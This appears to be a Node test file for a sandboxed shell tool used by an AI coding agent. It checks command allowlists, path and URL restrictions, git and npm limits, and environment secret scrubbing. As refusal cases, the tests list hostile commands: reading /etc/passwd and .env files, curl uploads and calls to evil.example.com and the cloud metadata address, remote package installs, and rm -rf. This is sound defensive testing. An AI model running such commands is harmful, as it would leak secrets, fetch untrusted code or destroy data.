// bash_sandboxed: tokenizer + per-command policy + env scrubbing. Fake runner except two local-only real runs.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { openJail } from './jail';
import { defaultSandboxPath, runProcess } from './env';
import { fdPath } from './safefs';
import { BASE_ALLOWED_HOSTS, planCommand, runSandboxed, sandboxEnv, ShellRefusal, tokenize, wrapWithPrefix, type ShellPolicyCtx } from './shell';
import { devSetup, fakeEnv, policySandboxPath, run, tmpDir } from './testkit';

const SP = policySandboxPath();
function ctx(isolated = false): ShellPolicyCtx {
  const j = openJail(path.join(tmpDir(), 'ws'), 'task-sh');
  fs.mkdirSync(path.join(j.root, 'src'));
  fs.writeFileSync(path.join(j.root, 'src', 'a.ts'), 'export {}');
  return { jail: j, cwd: j.root, allowedHosts: [...BASE_ALLOWED_HOSTS, 'madammuse.co'], isolated };
}
const plan = (c: ShellPolicyCtx, line: string) => planCommand(tokenize(line).argv, c, SP);
const refused = (c: ShellPolicyCtx, line: string, re?: RegExp) => assert.throws(() => plan(c, line), (e: unknown) => e instanceof ShellRefusal && (!re || re.test((e as Error).message)), line);

test('tokenize: quotes work, one trailing > or >> redirect', () => {
  assert.deepEqual(tokenize(`grep -rn "hello world" 'src'`).argv, ['grep', '-rn', 'hello world', 'src']);
  assert.deepEqual(tokenize(`sed -n 's/$//p' a`).argv, ['sed', '-n', 's/$//p', 'a']);
  assert.deepEqual(tokenize('npm test > out.txt'), { argv: ['npm', 'test'], redirect: { path: 'out.txt', append: false } });
  assert.deepEqual(tokenize('git log >> log.txt').redirect, { path: 'log.txt', append: true });
  assert.deepEqual(tokenize(`echo "a \\"q\\" b"`).argv, ['echo', 'a "q" b']);
});

test('tokenize rejects chaining, pipes, substitution, variables, input redirects, globs, newlines', () => {
  const bad = [
    'ls; rm -rf .', 'ls && cat x', 'ls || true', 'ls | sh', 'ls &', 'cat `whoami`', 'cat $(whoami)', 'cat "$(whoami)"', 'echo ${HOME}',
    'cat $HOME/x', 'echo "$GITHUB_TOKEN"', 'cat < x', 'npm test 2>&1', 'ls\nrm x', 'ls *.ts', 'ls src/?', '(ls)', 'ls > a > b',
    'ls > a b', 'cat ~/x', 'echo {a,b}', `ls 'unterminated`, 'ls "unterminated', '',
  ];
  for (const b of bad) assert.throws(() => tokenize(b), ShellRefusal, JSON.stringify(b));
});

test('only allowlisted commands, by name', () => {
  const c = ctx();
  for (const b of ['env', 'printenv', 'bash -c ls', 'sh x', 'python3 x.py', 'perl -e 1', 'chmod +x a', 'ln -s a b', 'tar xf a.tar', 'ssh host', 'nc -l 1', 'dd if=x', 'kill 1', 'sudo ls', 'xargs rm', 'awk 1 a', 'tee a']) {
    refused(c, b, /not allowed/);
  }
  refused(c, '/bin/ls', /by name/);
  refused(c, './node_modules/.bin/tsc', /by name/);
  assert.equal(path.basename(plan(c, 'ls -la src').file), 'ls');
});

test('path arguments: no absolute, no .., no secrets, no symlink escapes', () => {
  const c = ctx();
  refused(c, 'cat /etc/passwd', /absolute/);
  refused(c, 'cat ../other-task/file', /\.\./);
  refused(c, 'cat src/../../x', /\.\./);
  refused(c, 'cat .env', /secret/);
  refused(c, 'head -n 5 app/.env.production', /secret/);
  refused(c, 'cp keys/server.pem x', /secret/);
  refused(c, 'node --require=/tmp/evil.js a.js', /not allowed/);
  refused(c, 'tsc -p=/etc', /absolute/);
  const outside = tmpDir('rzh-out-');
  fs.writeFileSync(path.join(outside, 'x'), 'secret');
  fs.symlinkSync(path.join(outside, 'x'), path.join(c.jail.root, 'link'));
  refused(c, 'cat link', /symlink/);
  refused(c, 'rm -rf .', /workspace root/);
  refused(c, 'rm -rf ./', /workspace root/);
  refused(c, 'mv src/a.ts .git/hooks/pre-commit', /\.git/);
  assert.ok(plan(c, 'cat src/a.ts'));
  assert.ok(plan(c, 'cat .env.example'));
});

test('curl/wget: only allowlisted hosts, no redirects/config/proxy/upload/file reads', () => {
  const c = ctx();
  refused(c, 'curl https://evil.example.com/x', /URL not allowed/);
  refused(c, 'curl http://169.254.169.254/latest/meta-data', /URL not allowed/);
  refused(c, 'curl file:///etc/passwd', /URL not allowed/);
  refused(c, 'curl https://user:pw@github.com/', /URL not allowed/);
  refused(c, 'curl evil.com', /not an http/);
  refused(c, 'curl -L https://github.com/x', /-L is not allowed/);
  refused(c, 'curl -K cfg https://github.com/', /-K is not allowed/);
  refused(c, 'curl -x http://proxy https://github.com', /-x is not allowed/);
  refused(c, 'curl -k https://github.com', /-k is not allowed/);
  refused(c, 'curl -T src/a.ts https://github.com', /-T is not allowed/);
  refused(c, 'curl -d @src/a.ts https://github.com', /@file/);
  refused(c, 'curl -o /tmp/x https://github.com', /absolute/);
  refused(c, 'curl -H "Authorization: Bearer x" https://api.github.com', /auth/);
  refused(c, 'wget --execute=robots=off https://github.com', /not allowed/);
  refused(c, 'curl https://github.com.evil.com/', /URL not allowed/);
  const ok = plan(c, 'curl -sS -o page.html https://madammuse.co/');
  assert.deepEqual(ok.args.slice(0, 4), ['--proto', '=https,http', '--max-redirs', '0']);
  assert.ok(plan(c, 'curl -s https://madammuse.myshopify.com/products.json'));
  assert.ok(plan(c, 'wget -q -O reg.json https://registry.npmjs.org/react'));
});

test('any URL argument (not only curl) must be on the allowlist', () => {
  const c = ctx();
  refused(c, 'npm install https://evil.example.com/pkg.tgz', /URL not allowed/);
  refused(c, 'git clone https://gitlab.com/x/y', /URL not allowed/);
  refused(c, 'lighthouse https://competitor.com --output=json', /URL not allowed/);
  assert.ok(plan(c, 'lighthouse https://madammuse.co --output=json --output-path=lh.json'));
});

test('git: no push/config/global options/exec hooks; status etc. fine', () => {
  const c = ctx();
  refused(c, 'git push origin main', /github tool/);
  refused(c, 'git push --force', /github tool/);
  refused(c, 'git config user.email x', /managed by the worker/);
  refused(c, 'git -c core.pager=sh log', /global options/);
  refused(c, 'git --exec-path=. status', /global options/);
  refused(c, 'git -C .. status', /global options/);
  refused(c, 'git clone --upload-pack=touch https://github.com/a/b', /--upload-pack/);
  refused(c, 'git fetch -u evil origin', /-u/);
  refused(c, 'git clone -c core.fsmonitor=x https://github.com/a/b', /-c/);
  refused(c, 'git rebase -x "sh" main', /-x/);
  refused(c, 'git remote add evil https://github.com/x/y', /git remote/);
  refused(c, 'git submodule update', /submodule/);
  refused(c, 'git credential fill', /not allowed/);
  refused(c, 'git add .git/config', /\.git internals/);
  for (const ok of ['git status', 'git diff --stat', 'git log --oneline -n 5', 'git add -A', 'git commit -m "Fix hero spacing"', 'git checkout -b feature', 'git remote -v']) assert.ok(plan(c, ok), ok);
});

test('package managers: no publish/global/registry/exec; npx only allowlisted packages', () => {
  const c = ctx();
  refused(c, 'npm publish', /external action/);
  refused(c, 'pnpm publish', /external action/);
  refused(c, 'npm install -g typescript', /-g/);
  refused(c, 'npm install --registry=https://registry.npmjs.org/ x', /--registry/);
  refused(c, 'npm exec evil', /not allowed/);
  refused(c, 'pnpm dlx evil', /not allowed/);
  refused(c, 'npm config set x y', /not allowed/);
  refused(c, 'npx evil-package', /npx evil-package is not allowed/);
  refused(c, 'npx -p evil tsc', /npx option -p/);
  refused(c, 'npx --yes left-pad@1.0.0', /not allowed/);
  for (const ok of ['npm ci', 'pnpm install', 'npx --yes @shopify/cli@3 theme check --path theme', 'npx tsc --noEmit', 'npx prettier --check src']) {
    assert.ok(plan(c, ok), ok);
  }
  // Scripts and test runners execute workspace code: only with isolation (privilege drop / OS sandbox).
  const iso = ctx(true);
  for (const ok of ['npm run build', 'npm test', 'pnpm typecheck', 'pnpm --filter web test', 'npx playwright test']) {
    refused(c, ok, /isolated/);
    assert.ok(plan(iso, ok), ok);
  }
});

test('shopify: theme publish / live pushes refused; push needs --theme; maps to npx @shopify/cli', () => {
  const c = ctx();
  refused(c, 'shopify theme publish --theme 123', /request_external_action/);
  refused(c, 'shopify theme push --theme 1 --allow-live', /--allow-live/);
  refused(c, 'shopify theme push --live', /--live/);
  refused(c, 'shopify theme push -t 1 -p', /-p is not allowed/);
  refused(c, 'shopify theme push --path theme', /--theme/);
  refused(c, 'shopify theme delete -t 1', /not allowed/);
  refused(c, 'shopify app deploy', /only "shopify theme/);
  refused(c, 'npx @shopify/cli theme publish -t 1', /request_external_action/);
  refused(c, 'shopify theme push --theme 1 --password shptka_x', /passwords/);
  const p = plan(c, 'shopify theme push --theme 123456 --path src');
  assert.equal(path.basename(p.file), 'npx');
  assert.deepEqual(p.args.slice(0, 2), ['--yes', '@shopify/cli@latest']);
  assert.ok(plan(c, 'shopify theme check --path src'));
});

test('sed runs with --sandbox; find cannot exec; zip cannot run commands; cp cannot link', () => {
  const c = ctx();
  assert.equal(plan(c, `sed -i 's/a/b/' src/a.ts`).args[0], '--sandbox');
  refused(c, 'sed --follow-symlinks -i s/a/b/ src/a.ts', /follow-symlinks/);
  refused(c, `find . -name 'x' -exec rm {} ;`.replace(' ;', ''), /brace|-exec/);
  refused(c, 'find . -execdir ls', /-execdir/);
  refused(c, 'find -L .', /-L/);
  refused(c, 'find . -fprint out', /-fprint/);
  refused(c, 'zip -TT evil a.zip src', /-T/);
  refused(c, 'cp -s src/a.ts b', /links/);
  assert.ok(plan(c, `find . -name '*.liquid' -type f`));
  assert.ok(plan(c, 'grep -rn TODO src').args.includes('--exclude=.env*'));
});

test('sandbox env: minimal, HOME=jail, no tokens, proxy creds dropped', () => {
  const c = ctx();
  const env = sandboxEnv(c.jail, {
    GITHUB_TOKEN_DEFAULT: 'github_pat_SECRET', SHOPIFY_TOKEN_MADAM_MUSE: 'shpat_SECRET', SUPABASE_SERVICE_ROLE_KEY: 'svc', VAULT_MASTER_KEY: 'k',
    PATH: '/evil', HTTPS_PROXY: 'http://user:pw@proxy:8080', LANG: 'en_US.UTF-8', NODE_OPTIONS: '--require x',
  }, SP);
  assert.equal(env.HOME, c.jail.root);
  assert.equal(env.PATH, SP);
  assert.equal(env.LANG, 'en_US.UTF-8');
  assert.equal(env.npm_config_ignore_scripts, 'true');
  for (const k of ['GITHUB_TOKEN_DEFAULT', 'SHOPIFY_TOKEN_MADAM_MUSE', 'SUPABASE_SERVICE_ROLE_KEY', 'VAULT_MASTER_KEY', 'HTTPS_PROXY', 'NODE_OPTIONS']) assert.equal(env[k], undefined, k);
  assert.ok(!JSON.stringify(env).includes('SECRET'));
});

test('bash_sandboxed tool: runs in the jail with scrubbed env, clamps timeout, truncates output, redirects inside the jail', async () => {
  const f = fakeEnv({
    env: { GITHUB_TOKEN_DEFAULT: 'github_pat_0123456789abcdef' },
    run: (c) => (c.args.includes('huge') ? { stdout: 'y'.repeat(50_000) } : { stdout: 'ok github_pat_0123456789abcdef' }),
  });
  const s = devSetup(f.env);
  const out = await run(s.tools, 'bash_sandboxed', { command: 'ls -la', timeout_s: 9999 });
  const call = f.runCalls[0]!;
  assert.equal(call.opts.cwd, s.jailDir);
  assert.equal(call.opts.env.HOME, s.jailDir);
  assert.equal(call.opts.timeoutMs, 600_000);
  assert.ok(!Object.values(call.opts.env).some((v) => v.includes('github_pat')));
  assert.match(out, /exit 0/);
  assert.doesNotMatch(out, /github_pat_0123/, 'known secrets are redacted from output');
  assert.match(out, /\[REDACTED\]/);
  fs.mkdirSync(path.join(s.jailDir, 'huge'));
  const big = await run(s.tools, 'bash_sandboxed', { command: 'ls huge' });
  assert.match(big, /chars omitted/);
  assert.ok(big.length < 25_000);
  await run(s.tools, 'bash_sandboxed', { command: 'git log > logs.txt' });
  const fd = f.runCalls.at(-1)!.opts.stdoutFd!;
  assert.equal(fdPath(fd), path.join(s.jailDir, 'logs.txt'), 'the redirect file is opened by the worker (race-safe) and handed over as an fd');
  fs.closeSync(fd);
  assert.match(await run(s.tools, 'bash_sandboxed', { command: 'ls > ../../x' }), /^Refused/);
  assert.match(await run(s.tools, 'bash_sandboxed', { command: 'ls', cwd: '../' }), /^Refused/);
  assert.match(await run(s.tools, 'bash_sandboxed', { command: 'cat .env' }), /^Refused/);
  assert.equal(f.runCalls.length, 3, 'refused commands never spawn');
});

test('client website host is allowlisted for the task', async () => {
  const f = fakeEnv();
  const s = devSetup(f.env, 'web-dev', 'https://www.mid-am.com');
  assert.match(await run(s.tools, 'bash_sandboxed', { command: 'curl -sI https://mid-am.com/' }), /exit 0/);
  assert.match(await run(s.tools, 'bash_sandboxed', { command: 'curl -sI https://www.mid-am.com/' }), /exit 0/);
  assert.match(await run(s.tools, 'bash_sandboxed', { command: 'curl -sI https://madammuse.co/' }), /^Refused: URL not allowed/);
});

test('real process runner: timeout kills the process group; output goes to the redirect file', async () => {
  const j = openJail(path.join(tmpDir(), 'ws'), 'task-real');
  const env = sandboxEnv(j, {}, SP);
  const r = await runProcess(process.execPath, ['-e', 'setTimeout(() => {}, 20000)'], { cwd: j.root, env, timeoutMs: 300 });
  assert.equal(r.timedOut, true);
  const r2 = await runProcess('ls', ['-a'], { cwd: j.root, env, timeoutMs: 5000, stdoutFile: { path: path.join(j.root, 'o.txt'), append: false } });
  assert.equal(r2.code, 0);
  assert.match(fs.readFileSync(path.join(j.root, 'o.txt'), 'utf8'), /\.tmp/);
  const f = fakeEnv({ env: { DEV_SANDBOX_PREFIX: '["env"]' } }); // any wrapper = "isolated" for the policy
  f.env.run = runProcess;
  f.env.workspacesDir = path.dirname(j.root);
  fs.writeFileSync(path.join(j.root, 'keys.js'), "console.log(Object.keys(process.env).sort().join(','))");
  const out = await runSandboxed(f.env, j, BASE_ALLOWED_HOSTS, { command: 'node keys.js > keys.txt' });
  assert.match(out, /exit 0/);
  assert.match(fs.readFileSync(path.join(j.root, 'keys.txt'), 'utf8'), /HOME/);
});

test('DEV_SANDBOX_PREFIX wraps every command (e.g. bubblewrap) with the jail path substituted', async () => {
  assert.deepEqual(wrapWithPrefix(undefined, '/usr/bin/ls', ['-a'], '/w/t'), ['/usr/bin/ls', ['-a']]);
  assert.deepEqual(wrapWithPrefix('["bwrap","--bind","{jail}","{jail}"]', '/usr/bin/ls', ['-a'], '/w/t'), ['bwrap', ['--bind', '/w/t', '/w/t', '/usr/bin/ls', '-a']]);
  assert.throws(() => wrapWithPrefix('bwrap --x', 'ls', [], '/w'), ShellRefusal);
  const f = fakeEnv({ env: { DEV_SANDBOX_PREFIX: '["firejail","--net=none","--private={jail}"]' } });
  const s = devSetup(f.env);
  await run(s.tools, 'bash_sandboxed', { command: 'ls' });
  assert.equal(f.runCalls[0]!.file, 'firejail');
  assert.deepEqual(f.runCalls[0]!.args.slice(0, 2), ['--net=none', `--private=${s.jailDir}`]);
});
